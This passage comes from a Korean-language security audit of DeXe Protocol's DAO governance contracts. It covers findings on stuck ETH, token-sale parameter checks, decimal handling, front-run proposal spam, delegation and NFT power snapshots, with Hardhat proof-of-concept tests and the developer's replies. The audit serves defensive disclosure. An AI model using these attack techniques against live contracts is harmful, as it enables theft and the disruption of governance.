        await token.mint(govPool.address, wei("10"));

        // use GovPool to create a proposal with 10 wei reward
        await govPool.createProposal(
          "example.com",
          [
            [token.address, 0, getBytesApprove(dp.address, wei("10"))],
            [dp.address, 0, getBytesDistributionProposal(1, token.address, wei("10"))],
          ],
          [],
          { from: SECOND }
        );

        // fully fund the proposal using both erc20 token and eth at the same time
        await impersonate(govPool.address);
        await token.approve(dp.address, wei("10"), { from: govPool.address });
        await dp.execute(1, token.address, wei("10"), { value: wei(10), from: govPool.address });

        // only 1 vote so SECOND should get the entire 10 wei reward
        await govPool.vote(1, true, 0, [1], { from: SECOND });

        // claiming the reward releases the erc20 tokens but the eth remains stuck
        await dp.claim(SECOND, [1]);

        // DistributionProposal eth balance at 10 wei, reward eth is stuck
        let balanceAfter = toBN(await web3.eth.getBalance(dp.address));
        assert.equal(balanceAfter, wei("10"));
      });
```
실행: `npx hardhat test --grep "audit new distribution proposals funded by both eth & erc20 tokens results in stuck eth"`

**권장 완화 방법:** `DistributionProposal::execute()`는 `token != ETHEREUM_ADDRESS && msg.value > 0`일 경우 되돌려져야(revert) 합니다.

동일한 문제가 나타나는 곳에서 유사한 수정이 이루어져야 합니다:
* `TokenSaleProposalBuy::buy()`
* `TokenSaleProposalWhitelist::lockParticipationTokens()`

**Dexe:**

커밋 [5710f31](https://github.com/dexe-network/DeXe-Protocol/commit/5710f31a515b40fab27d55e55adc3df19efca489#diff-9559fcfcd35b0e7d69c24765fb0d5996a7b0b87781860c7f821867c26109814f) 및 [64bbcf5](https://github.com/dexe-network/DeXe-Protocol/commit/64bbcf5b1575e88ead4e5fd58d8ee210a815aad6)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 중요한 토큰 판매 매개변수에 대한 검증 부족으로 악의적인 DAO 풀 생성자가 토큰 판매 참가자의 청구를 DOS(서비스 거부)할 수 있음

**설명:** 티어를 생성할 때 DAO 풀 생성자는 사용자 정의 토큰 판매 매개변수를 정의할 수 있습니다. 이러한 매개변수는 `TokenSaleProposalCreate::_validateTierInitParams`에서 확인됩니다. 그러나 이 함수는 잠재적으로 토큰 판매 참가자가 구매한 DAO 토큰을 청구하는 것을 거부할 수 있는 몇 가지 중요한 검증을 놓치고 있습니다.

1. `TierInitParams::saleEndTime` - 무기한으로 긴 판매 기간은 초기 토큰 판매 참가자가 합리적인 시간 내에 청구하는 것을 거부할 수 있습니다.
2. `TierInitParams::claimLockDuration` - 무기한으로 긴 청구 잠금 기간은 토큰 판매 참가자의 청구를 거부할 수 있습니다.
3. `VestingSettings::vestingDuration` - 무기한으로 긴 베스팅 기간은 판매 참가자가 완전히 베스팅되기 위해 영원히 기다려야 함을 의미합니다.
4. `VestingSettings::cliffPeriod` - 무기한으로 긴 클리프(cliff) 기간은 사용자가 베스팅된 토큰을 청구하는 것을 방지합니다.


**영향:** 위의 모든 사항은 토큰 판매 참가자의 정당한 청구를 DOS(서비스 거부)하는 순 효과를 가집니다.

**권장 완화 방법:** 이러한 매개변수에 대해 합리적인 제한을 강제하는 전역 변수를 갖는 것을 고려하십시오. DAO 풀 생성자는 악의적일 수 있으므로 프로토콜은 순진한/처음 참가자를 보호하는 확인을 도입해야 합니다.

**Dexe:**
`claimLockDuration <= cliffPeriod` 베스팅 기간 유효성 검사를 추가하여 커밋 [440b8b3](https://github.com/dexe-network/DeXe-Protocol/commit/440b8b3534d58d16df781b402503be5a64d5d576)에서 수정되었습니다. 다른 제안과 관련하여 우리는 DAO에게 가능한 한 많은 자유를 허용하고 싶습니다. DAO가 100년 내에 토큰 판매를 생성하기로 결정하면 우리는 그들을 제한하고 싶지 않습니다.


### 코드베이스 전반에 걸친 토큰 금액에 대한 일관성 없는 소수점 처리로 인해 Dexe DAO 계약과 상호 작용하는 사용자의 보안 위험 증가

**설명:** 토큰 금액에 대해 가정된 소수점 형식과 관련하여 코드베이스 내에서 불일치가 확인되었습니다. 코드의 일부 섹션은 토큰 금액이 기본 토큰 소수점이라고 가정하고 필요할 때 18 소수점으로 변환하는 반면, 다른 섹션은 모든 토큰 금액이 18 소수점이라고 가정합니다. 이러한 불일치는 잠재적인 문제를 야기합니다.

_사용자 혼란_: 사용자는 토큰 금액을 기본 토큰 소수점으로 제공해야 하는지 아니면 18 소수점으로 제공해야 하는지 결정하기 어려워 혼란을 겪을 수 있습니다.

_검증 오류_: 특정 시나리오에서 이러한 불일치는 잘못된 검증을 초래할 수 있습니다. 예를 들어, 서로 다른 소수점 형식의 금액을 비교하면 부정확한 결과가 나올 수 있으며, 이는 사과와 오렌지를 비교하는 것과 유사한 상황을 만듭니다.

_잘못된 전송_: 소수점 형식에 대한 가정으로 인해 잘못된 토큰 전송의 위험도 있습니다. 잘못 정규화된 금액은 의도하지 않은 토큰 전송을 초래할 수 있습니다.

예를 들어, `TokenSaleProposalCreate::createTier`를 통해 새 토큰 판매 제안을 시작할 때, 함수는 티어 매개변수 `minAllocationPerUser`, `maxAllocationPerUser`, `totalTokenProvided`를 토큰 소수점에서 18 소수점으로 정규화합니다.

`TokenSaleProposalCreate::createTier`
```solidity
  function createTier(
        mapping(uint256 => ITokenSaleProposal.Tier) storage tiers,
        uint256 newTierId,
        ITokenSaleProposal.TierInitParams memory _tierInitParams
    ) external {
        _validateTierInitParams(_tierInitParams);

        uint256 saleTokenDecimals = _tierInitParams.saleTokenAddress.decimals();
        uint256 totalTokenProvided = _tierInitParams.totalTokenProvided;

  >      _tierInitParams.minAllocationPerUser = _tierInitParams.minAllocationPerUser.to18(
            saleTokenDecimals
        ); //@audit -> normalised to 18 decimals
   >    _tierInitParams.maxAllocationPerUser = _tierInitParams.maxAllocationPerUser.to18(
            saleTokenDecimals
        ); //@audit -> normalised to 18 decimals
   >     _tierInitParams.totalTokenProvided = totalTokenProvided.to18(saleTokenDecimals); //@audit -> normalised to 18 decimals

        ....
}
```
그러나 참가자가 `TokenSaleProposal::buy`를 호출할 때 판매 토큰 금액(구매 토큰의 환율에서 파생됨)은 18 소수점이라고 가정됩니다. `TokenSaleProposalBuy::getSaleTokenAmount` 함수는 이 금액을 사용자당 티어 최소 및 최대 할당량과 비교합니다.

`TokenSaleProposalBuy::getSaleTokenAmount`
```solidity
  function getSaleTokenAmount(
        ITokenSaleProposal.Tier storage tier,
        address user,
        uint256 tierId,
        address tokenToBuyWith,
        uint256 amount
    ) public view returns (uint256) {
        ITokenSaleProposal.TierInitParams memory tierInitParams = tier.tierInitParams;
     require(amount > 0, "TSP: zero amount");
        require(canParticipate(tier, tierId, user), "TSP: cannot participate");
        require(
            tierInitParams.saleStartTime <= block.timestamp &&
                block.timestamp <= tierInitParams.saleEndTime,
            "TSP: cannot buy now"
        );

        uint256 exchangeRate = tier.rates[tokenToBuyWith];
>        uint256 saleTokenAmount = amount.ratio(exchangeRate, PRECISION); //@audit -> this saleTokenAmount is in  saleToken decimals -> unlike in the createTier function, this saleTokenAmount is not normalised to 18 decimals

        require(saleTokenAmount != 0, "TSP: incorrect token");

    >     require(
            tierInitParams.maxAllocationPerUser == 0 ||
                (tierInitParams.minAllocationPerUser <= saleTokenAmount &&
                    saleTokenAmount <= tierInitParams.maxAllocationPerUser),
            "TSP: wrong allocation"
        ); //@audit checks sale token amount is in valid limits
        require(
            tier.tierInfo.totalSold + saleTokenAmount <= tierInitParams.totalTokenProvided,
            "TSP: insufficient sale token amount"
        ); //@audit checks total sold is less than total provided
}
```

토큰 금액이 토큰 소수점이라고 가정되는 다른 인스턴스는 다음과 같습니다:

- 토큰 판매 생성 제안에서 참가 정보를 설정하는 데 사용되는 `TokenSaleProposalCreate::_setParticipationInfo`
- 보상 분배 제안을 실행하는 데 사용되는 `DistributionProposal::execute`


**영향:** 일관성 없는 토큰 금액 표현은 잘못된 검증이나 잘못된 전송을 유발할 수 있습니다.

**권장 완화 방법:** 프로토콜에서 토큰 금액을 처리할 때 토큰 소수점에 대한 표준화된 접근 방식을 채택하는 것이 중요합니다. 토큰 소수점을 처리할 때 아래 언급된 규칙 중 하나를 따르는 것을 고려하십시오:

_기본 토큰 소수점_: 이 규칙에서는 각 토큰 금액이 기본 토큰의 소수점 형식으로 표현된다고 가정합니다. 예를 들어, USDC의 100은 100 * 10^6의 토큰 금액을 나타내는 반면, DAI의 100은 100 * 10^18의 토큰 금액을 나타냅니다. 이 접근 방식에서 프로토콜은 올바른 토큰 소수점 정규화를 보장할 책임을 집니다.

_고정 18 소수점_: 대안으로 모든 함수에 전달되는 모든 토큰 금액이 항상 18 소수점이라고 가정할 수 있습니다. 그러나 이는 사용자에게 필요한 토큰 소수점 정규화를 수행할 책임을 부여합니다.

두 옵션 모두 실행 가능하지만, 옵션 1을 강력히 권장합니다. 이는 업계 표준과 일치하고 직관적이며 사용자 오류 가능성을 최소화합니다. Web3가 다양한 사용자를 끌어들이는 점을 감안할 때 옵션 1을 채택하면 프로토콜이 필요한 변환을 사전에 처리하여 사용자 경험을 향상시키고 오해의 가능성을 줄일 수 있습니다.

**Dexe:**
커밋 [4a4c9d0](https://github.com/dexe-network/DeXe-Protocol/commit/4a4c9d0ee9f9f0a2fcf9d378739dafbbafa5fcf7)에서 수정되었습니다.

**Cyfrin:** 확인됨. Dexe는 사용자가 18 소수점으로 입력 토큰 금액을 보낸다고 가정하는 "고정 18 소수점" 옵션을 선택했습니다. 이는 대부분의 코드에서 이미 기본 동작이었습니다. Cyfrin은 사용자가 토큰의 기본 소수점으로 입력 금액을 사용하여 함수를 호출하고 변환하는 것은 프로토콜의 책임인 "기본 소수점" 옵션을 계속 권장합니다.


### 공격자가 동일한 제안을 스팸 생성하여 사용자가 어떤 것이 투표할 실제 제안인지 혼동하게 할 수 있음

**설명:** 공격자가 특정 제안에 대한 투표를 방해하려면 동일한 제안을 많이 스팸 생성하여 사용자가 투표해야 할 "실제" 제안이 무엇인지 혼동하게 할 수 있습니다. 사용자는 어떤 `proposalId`가 실제인지 결정해야 합니다. 사용자가 다른 부호 없는 정수(unsigned integer)보다 하나의 부호 없는 정수를 신뢰해야 할 이유가 무엇입니까?

**영향:** 똑같이 생긴 가짜 제안을 생성하면 두 가지 잠재적인 영향이 있습니다:

_투표 분할_: 사용자는 가짜 제안과 실제 제안을 구별하는 데 어려움을 겪을 것입니다. 결과적으로 투표가 단일 실제 제안에 집중되는 대신 가짜 제안으로 잘못 분산될 수 있습니다. 이 기르핑(griefing) 공격은 가스 비용과 복사할 제안을 생성하는 데 필요한 토큰 비용만으로 누구나 실행할 수 있습니다.

_악의적인 행동_: 생성자는 하나의 악의적인 제안 작업을 제외하고 모든 면에서 동일한 유사한 제안을 생성하여 악의적인 제안 작업을 위장할 수 있습니다. 사용자가 필요한 실사 없이 투표할 가능성이 높습니다.


**개념 증명 (Proof of Concept):** 100% 자동화될 수 있고 실제 제안에서 가짜 제안으로 투표를 분산시키는 데 매우 효과적인 이 공격의 한 가지 변형을 고려해 보십시오. 공격자가 방해하려는 제안 생성 트랜잭션이 멤풀에 나타나면 공격자는 동일한 확률로 3가지 전략 중 1가지를 수행할 수 있습니다:

1) 프런트런(front-run) - 실제 제안보다 먼저 2개의 동일한 가짜 제안을 생성합니다; 실제 제안은 가장 큰 `proposalId`를 갖습니다.
2) 샌드위치(sandwich) - 실제 제안의 양쪽에 2개의 동일한 가짜 제안을 생성합니다; 실제 제안은 첫 번째 가짜보다 크지만 두 번째 가짜보다 작은 `proposalId` 값을 갖습니다.
3) 백런(back-run) - 실제 제안 뒤에 2개의 동일한 가짜 제안을 생성합니다; 실제 제안은 가장 작은 `proposalId`를 갖습니다.

**권장 완화 방법:** DAO 풀에서 조정할 수 있는 제안 생성자의 토큰에 대한 '잠금 기간'을 구현하는 것을 고려하십시오. 제안 생성에 대한 더 높은 최소 토큰 요구 사항과 함께, 이는 중복 제안을 억제하고 DAO의 보안을 강화할 수 있습니다.

**Dexe:**
우리는 이미 몇 가지 보호 메커니즘을 구현했습니다. 사용자가 제안을 생성하려면 DAO 풀에 "구성 가능한" 양의 토큰을 예치해야 합니다. 또한 사용자는 동일한 블록에서 이러한 토큰을 인출할 수 없으므로 플래시론(flashloan)을 사용하여 제안을 생성하는 것이 불가능합니다. 제안 생성에는 가스 비용이 들며 이는 DOS 보호 역할도 합니다.


### `GovPool::revoteDelegated()`가 다중 계층 위임을 지원하지 않아 위임된 투표가 1차 투표자에게 전달되지 않음

**설명:** 제안에 `delegatedVotingAllowed == false`가 있어 [`GovPoolVote::revoteDelegated()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolVote.sol#L103-L106)에서 자동 위임 재투표가 발생할 때, 위임된 투표는 다중 위임 계층을 통해 1차 투표자에게 전달되지 않습니다.

**영향:** 다중 위임 계층을 통한 위임된 투표는 1차 투표자에게 전달되지 않으므로 계산되지 않습니다.

이 문제는 기존 DAO의 투표 행동을 분석할 때 중요합니다. [KarmaHQ](https://www.youtube.com/watch?v=ckxxujKd7ug&t=950s)의 프레젠테이션에서 프로토콜 전반의 대리인 중 50% 이상이 제안 투표에 참여하지 않는 것으로 나타났습니다. 다중 계층 위임을 가능하게 함에도 불구하고 현재 시스템의 설계는 이러한 위임된 토큰을 정확하게 추적하고 설명하지 못합니다.


**개념 증명 (Proof of Concept):** 1개의 제안과 3명의 사용자: FINAL_VOTER, FIRST_DELEGATOR, SECOND_DELEGATOR를 고려하십시오. 모든 사용자는 100의 투표권을 가집니다.

1) FINAL_VOTER가 100을 투표합니다.

2) FIRST_DELEGATOR가 자신의 100 투표권을 FINAL_VOTER에게 위임합니다. 이것은 FINAL_VOTER의 자동 취소 및 재투표를 트리거하여 FINAL_VOTER가 제안에 대해 총 200 투표권을 갖게 합니다.

3) SECOND_DELEGATOR가 자신의 100 투표권을 FIRST_DELEGATOR에게 위임합니다. FIRST_DELEGATOR가 자신의 투표권을 FINAL_VOTER에게 위임했음에도 불구하고, 이 새로 위임된 투표권은 FINAL_VOTER에게 전달되지 않으므로 FINAL_VOTER의 총 투표권은 여전히 200입니다.

사용자로서 내가 투표권을 다른 사용자에게 위임했고 그 사용자가 또한 자신의 투표권을 위임했다면, 내 위임된 투표권도 그들의 투표권과 함께 최종 1차 투표자에게 전달되어야 한다고 기대할 것입니다. 그렇지 않으면 내 위임된 투표권은 단순히 사라집니다.

다음 PoC를 `GovPool.test.js`에 넣으십시오:

```javascript
      describe("audit tiered revoteDelegate", () => {
          // using simple to verify amounts
          let voteAmount     = wei("1000000000000000000");
          let totalVotes1Deg = wei("2000000000000000000");
          let totalVotes2Deg = wei("3000000000000000000");
          let proposal1Id    = 1;

          let FIRST_DELEGATOR;
          let SECOND_DELEGATOR;
          let FINAL_VOTER;

          beforeEach(async () => {
            FIRST_DELEGATOR  = await accounts(10);
            SECOND_DELEGATOR = await accounts(11);
            FINAL_VOTER      = await accounts(12);

            // mint tokens & deposit them to have voting power
            await token.mint(FIRST_DELEGATOR, voteAmount);
            await token.approve(userKeeper.address, voteAmount, { from: FIRST_DELEGATOR });
            await govPool.deposit(FIRST_DELEGATOR, voteAmount, [], { from: FIRST_DELEGATOR });
            await token.mint(SECOND_DELEGATOR, voteAmount);
            await token.approve(userKeeper.address, voteAmount, { from: SECOND_DELEGATOR });
            await govPool.deposit(SECOND_DELEGATOR, voteAmount, [], { from: SECOND_DELEGATOR });
            await token.mint(FINAL_VOTER, voteAmount);
            await token.approve(userKeeper.address, voteAmount, { from: FINAL_VOTER });
            await govPool.deposit(FINAL_VOTER, voteAmount, [], { from: FINAL_VOTER });

            // ensure that delegatedVotingAllowed == false so automatic re-voting
            // will occur for delegation
            let defaultSettings = POOL_PARAMETERS.settingsParams.proposalSettings[0];
            assert.equal(defaultSettings.delegatedVotingAllowed, false);

            // create 1 proposal
            await govPool.createProposal("proposal1", [[token.address, 0, getBytesApprove(SECOND, 1)]], []);

            // verify delegatedVotingAllowed == false
            let proposal1 = await getProposalByIndex(proposal1Id);
            assert.equal(proposal1.core.settings[1], false);
          });

        it("audit testing 3 layer revote delegation", async () => {

          // FINAL_VOTER votes on proposal
          await govPool.vote(proposal1Id, true, voteAmount, [], { from: FINAL_VOTER });

          // verify FINAL_VOTER's voting prior to first delegation
          assert.equal(
            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote)).totalRawVoted,
            voteAmount
          );
          assert.equal(
            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.MicropoolVote)).totalRawVoted,
            "0" // nothing delegated to AUDITOR yet
          );
          assert.equal(
            (await govPool.getTotalVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote))[0].toFixed(),
            voteAmount
          );

          // FIRST_DELEGATOR delegates to FINAL_VOTER, this should cancel FINAL_VOTER's original votes
          // and re-vote for FINAL_VOTER which will include the delegated votes
          await govPool.delegate(FINAL_VOTER, voteAmount, [], { from: FIRST_DELEGATOR });

          // verify FINAL_VOTER's voting after first delegation
          assert.equal(
            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote)).totalRawVoted,
            voteAmount // personal votes remain the same
          );
          assert.equal(
            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.MicropoolVote)).totalRawVoted,
            voteAmount // delegated votes now included
          );
          assert.equal(
            (await govPool.getTotalVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote))[0].toFixed(),
            totalVotes1Deg // delegated votes now included
          );

          // SECOND_DELEGATOR delegates to FIRST_DELEGATOR. These votes won't carry through into FINAL_VOTER
          await govPool.delegate(FIRST_DELEGATOR, voteAmount, [], { from: SECOND_DELEGATOR });

          // verify FINAL_VOTER's voting after second delegation
          assert.equal(
            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote)).totalRawVoted,
            voteAmount // personal votes remain the same
          );
          assert.equal(
            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.MicropoolVote)).totalRawVoted,
            voteAmount // delegated votes remain the same
          );
          assert.equal(
            (await govPool.getTotalVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote))[0].toFixed(),
            totalVotes2Deg // fails here as delegated votes only being counted from the first delegation
          );
        });
      });
```

실행: `npx hardhat test --grep "audit testing 3 layer revote delegation"`

**권장 완화 방법:** `delegatedVotingAllowed == false`인 경우 `GovPoolVote::revoteDelegated()`는 위임된 투표가 다중 위임 계층을 통해 1차 투표자에게 자동으로 전달되도록 해야 합니다. 프로젝트가 이를 구현하기를 원하지 않는다면, 사용자가 위임한 주소도 위임하고 투표하지 않는 경우 위임된 투표가 아무런 효과가 없음을 사용자에게 명확히 해야 합니다. 선호 투표 시스템을 사용하는 국가에서 온 많은 사용자는 자연스럽게 자신의 투표가 여러 위임 계층을 통해 전달될 것으로 기대할 것입니다.

**Dexe:**
우리는 의도적으로 이를 구현하지 않기로 결정했습니다. 많은 투표 시스템이 있지만 우리는 명시성과 투명성을 선호합니다. 다중 위임 계층을 지원하면 시스템의 복잡성이 증가하고 DOS 공격 벡터가 도입됩니다(예: 위임 대기열이 너무 커서 블록에 맞지 않는 경우).


### 사용자가 위임된 재무(treasury) 투표권을 사용하여 더 많은 위임된 재무 투표권을 제공하는 제안에 투표할 수 있음

**설명:** [`GovPoolCreate::_restrictInterestedUsersFromProposal()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolCreate.sol#L164-L170)은 사용자로부터 재무 투표권을 위임 해제(undelegate)하는 제안에 대해 사용자가 투표하지 못하도록 제한할 수 있지만, 사용자에게 재무 투표권을 위임하는 제안에 대한 투표와 관련해서는 이러한 제한이 적용되지 않습니다. 이를 통해 위임된 재무 투표권을 받은 사용자는 동일한 권한을 사용하여 자신에게 더 많은 위임된 재무 권한을 제공하는 제안에 투표할 수 있습니다.

**영향:** 사용자는 위임된 재무 투표권을 사용하여 자신에게 더 많은 위임된 재무 투표권을 제공하는 제안에 투표할 수 있습니다. 이는 특히 내부 제안일 수 있으므로 위험해 보입니다.

**개념 증명 (Proof of Concept):** N/A

**권장 완화 방법:** 옵션 1) `GovPoolCreate::_restrictInterestedUsersFromProposal()`은 사용자가 재무 투표권을 위임하는 제안에 투표하지 못하도록 제한할 수 있어야 합니다.

옵션 2) 이 제한을 하드코딩하는 것이 더 간단할 수 있습니다. 사용자에게 위임된 재무 투표권이 있는 경우 이 권한을 늘리거나 줄이는 제안에 투표할 수 없습니다.

원칙적으로 위임된 재무 투표권을 받은 사용자는 DAO의 의지에 따라 이 권한을 유지하며, 자신이나 다른 사용자를 위해 이 권한을 늘리거나 줄이는 제안에 투표하는 데 이 권한을 절대 사용할 수 없어야 합니다.

현재는 제안을 생성하는 사용자가 올바른 사용자가 투표하지 못하도록 제한하는 것에 의존하고 있으며, 이는 오류가 발생하기 쉽고 이 권한을 줄이는 경우에만 작동하고 늘리는 경우에는 작동하지 않습니다.

**Dexe:**
[PR168](https://github.com/dexe-network/DeXe-Protocol/commit/01bc28e89a99da5f7b67d6645c935f7230a8dc7b)에서 수정되었습니다.

**Cyfrin:** Dexe는 제한된 사용자가 그러한 제안에 투표하는 것을 허용하되, 위임된 재무로는 투표하지 못하도록 선택했습니다. 제한된 사용자의 위임된 재무는 필수 정족수 계산에서 차감되며 제한된 사용자는 해당 제안에 대해 그것으로 투표할 수 없습니다. 이는 재무 권한 위임/위임 해제 및 전문가 NFT 소각에 적용되므로, 위임된 재무 권한을 받은 사용자는 이를 사용하여 자신에게 더 많은 재무 권한을 위임할 수 없습니다.

그러나 Dexe는 다음 권장 사항을 완전히 구현하지 않았습니다: *"자신이나 **다른 사용자를 위해** 이 권한을 늘리거나 줄이는 제안에 투표하는 데 이 권한을 절대 사용할 수 없어야 합니다."* 위임된 재무 권한을 가진 사용자는 자신이 제어하는 다른 주소로 재무 권한을 위임하는 제안을 생성한 다음 위임된 재무 권한이 있는 기존 주소로 해당 제안에 투표함으로써 새로운 제한을 우회할 수 있습니다.

Cyfrin은 위임된 재무 투표권을 받은 사용자가 자신뿐만 아니라 다른 사용자를 위해 재무 투표권을 위임/위임 해제하는 제안에 투표하는 것이 허용되지 않도록 계속 권장합니다.


### `GovPool::setNftMultiplierAddress()`를 호출하는 제안을 실행하여 `nftMultiplier` 주소를 변경하면 기존 사용자가 보류 중인 NFT 승수 보상을 청구하는 것을 거부할 수 있음

**설명:** 내부 제안에 의해 호출될 수 있는 [`GovPool::setNftMultiplierAddress()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/GovPool.sol#L343-L345)는 NFT 승수 주소를 새 계약으로 업데이트합니다.

`GovPoolRewards::_getMultipliedRewards()`는 보상을 계산할 때 NFT 승수 주소를 검색하기 위해 `GovPool::getNftContracts()`를 [호출](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-pool/GovPoolRewards.sol#L203)합니다. 계약이 다른 계약으로 업데이트된 경우 청구되지 않은 NFT 승수 보상은 더 이상 존재하지 않습니다.

**영향:** `GovPool::setNftMultiplierAddress()`를 실행하는 데 필요한 투표를 제안이 얻으면 사용자는 청구되지 않은 NFT 승수 보상을 잃게 됩니다.

**개념 증명 (Proof of Concept):** N/A

**권장 완화 방법:** 제안이 생성될 때 현재 NFT 승수 계약의 주소를 각 제안에 대해 저장하면, 전역 NFT 승수 주소 업데이트는 새 제안에만 적용될 수 있습니다.

이것이 의도된 설계인 경우, 사용자에게 청구되지 않은 NFT 승수 보상이 있는 모든 사용자에게 제안 투표 기간이 종료되기 전에 수집하도록 알리는 사용자 알림을 구현하는 것을 고려하십시오. 또한 문서에 승수 보상 업데이트를 목표로 하는 제안에 투표하면 청구되지 않은 보상이 몰수될 수 있음을 사용자에게 알리는 명시적인 면책 조항을 포함하는 것을 고려하십시오. 이러한 투명성은 사용자가 정보에 입각한 결정을 내리고 잠재적인 예상치 못한 결과를 완화하는 데 도움이 될 것입니다.

**Dexe:**
인지함; 이것은 예상되는 동작입니다. DAO가 NFT 승수를 추가/제거하기로 결정하면 DAO 구성원 모두에게 영향을 미쳐야 합니다. 이것은 실제로 두 가지 방식으로 작동합니다. DAO가 NFT 승수를 추가하기로 결정하면 청구되지 않은 모든 보상이 부스트됩니다.


### 제안 생성 시 스냅샷 전에 NFT 전력이 업데이트되지 않아 잘못된 `ERC721Power::totalPower` 사용

**설명:** `GovPool`이 `ERC721Power` NFT를 사용하도록 구성된 경우, 제안이 생성될 때 NFT 전력을 다시 계산하지 않고 스토리지에서 `ERC721Power::totalPower`를 바로 [읽습니다](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L331).

이것은 오래된 값을 읽을 것이므로 잘못되었습니다. 먼저 NFT 전력을 다시 계산한 다음 읽어서 정확한 현재 값을 읽어야 합니다. `GovUserKeeper`에는 정확히 이 작업을 수행하는 [테스트](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/test/gov/GovUserKeeper.test.js#L1470-L1471)가 있습니다. `GovUserKeeper::createNftPowerSnapshot()`을 호출하기 전에 테스트는 `GovUserKeeper::updateNftPowers()`를 호출합니다. 그러나 실제 코드베이스에서는 테스트에서만 `GovUserKeeper::updateNftPowers()`를 호출하는 것으로 보입니다.

**영향:** 제안은 잘못되고 잠재적으로 훨씬 더 큰 `ERC721Power::totalPower`로 생성됩니다. 이는 [`GovUserKeeper::getNftsPowerInTokensBySnapshot()의 제수`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L559)로 사용되므로 부실한 더 큰 제수는 NFT의 투표권을 잘못 줄입니다.

**개념 증명 (Proof of Concept):** 먼저 테스트가 제자리에서 NFT를 업데이트할 수 있도록 [이 확인을 주석 처리하십시오](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L690).

그런 다음 `GovPool.test.js`의 `describe("getProposalState()", () => {` 섹션 아래에 PoC를 추가하십시오:
```javascript
      it("audit proposal creation uses incorrect ERC721Power totalPower as nft power not updated before snapshot", async () => {
        let powerNftCalcStartTime = (await getCurrentBlockTime()) + 200;

        // required so we can call .toFixed() on BN returned outputs
        ERC721Power.numberFormat = "BigNumber";

        // ERC721Power::totalPower should be zero as no nfts yet created
        assert.equal((await nftPower.totalPower()).toFixed(), "0");

        // so proposal doesn't need to go to validators
        await changeInternalSettings(false);

        // set nftPower as the voting nft
        // need to comment out check preventing updating existing
        // nft address in GovUserKeeper::setERC721Address()
        await impersonate(govPool.address);
        await userKeeper.setERC721Address(nftPower.address, wei("33000"), 33, { from: govPool.address });

        // create a new VOTER account and mint them 5 power nfts
        let VOTER = await accounts(10);
        await nftPower.safeMint(VOTER, 1);
        await nftPower.safeMint(VOTER, 2);
        await nftPower.safeMint(VOTER, 3);
        await nftPower.safeMint(VOTER, 4);
        await nftPower.safeMint(VOTER, 5);

        // advance to the approximate time when nft power calculation starts
        await setTime(powerNftCalcStartTime);

        // save existing nft power after power calculation has started
        let nftTotalPowerBefore = "4500000000000000000000000000";
        assert.equal((await nftPower.totalPower()).toFixed(), nftTotalPowerBefore);

        // advance time; since none of the nfts have collateral deposited
        // their power will decrement
        await setTime((await getCurrentBlockTime()) + 10000);

        // create a proposal which takes a snapshot of the current nft power
        // but fails to update it before taking the snapshot, so uses the
        // old incorrect power
        let proposalId = 2;

        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(3, wei("100"), [], false)]]
        );

        // verify the proposal snapshot saved the nft totalPower before the time
        // was massively advanced. This is incorrect as the true totalPower is 0
        // by this time due to the nfts losing power. The proposal creation process
        // fails to recalculate nft power before reading ERC721Power::totalPower
        assert.equal((await userKeeper.nftSnapshot(2)).toFixed(), nftTotalPowerBefore);

        // call ERC721::recalculateNftPower() for the nfts, this will update
        // ERC721Power::totalPower with the actual current total power
        await nftPower.recalculateNftPower("1");
        await nftPower.recalculateNftPower("2");
        await nftPower.recalculateNftPower("3");
        await nftPower.recalculateNftPower("4");
        await nftPower.recalculateNftPower("5");

        // verify that the true totalPower has decremented to zero as the nfts
        // lost all their power since they didn't have collateral deposited
        assert.equal((await nftPower.totalPower()).toFixed(), "0");

        // the proposal was created with an over-inflated nft total power
        // GovUserKeeper has a function called updateNftPowers() that is onlyOwner
        // meaning it is supposed to be called by GovPool, but this function
        // is never called anywhere. But in the GovUserKeeper unit tests it is
        // called before the call to createNftPowerSnapshot() which creates
        // the snapshot reading ERC721Power::totalPower
      });
```

실행: `npx hardhat test --grep "audit proposal creation uses incorrect ERC721Power totalPower"`

**권장 완화 방법:** `GovUserKeeper::updateNftPowers()`를 하나씩 호출하는 많은 NFT가 있을 수 있으므로 이 업데이트를 수행하는 효율적인 방법이 아닙니다. 솔루션에는 파워 NFT 작동 방식의 리팩토링이 포함될 수 있습니다.

**Dexe:**
[PR172](https://github.com/dexe-network/DeXe-Protocol/commit/b2b30da3204acd16da6fa61e79703ac0b6271815), [PR173](https://github.com/dexe-network/DeXe-Protocol/commit/15edac2ba207a915bd537684cd7644831ec2c887)에서 수정되었습니다. 스냅샷이 제거되었습니다.

**Cyfrin:** 확인됨.


### 잘못 작동하는 검증자는 투표권이 0으로 줄어든 후에도 투표 결과에 영향을 미칠 수 있음

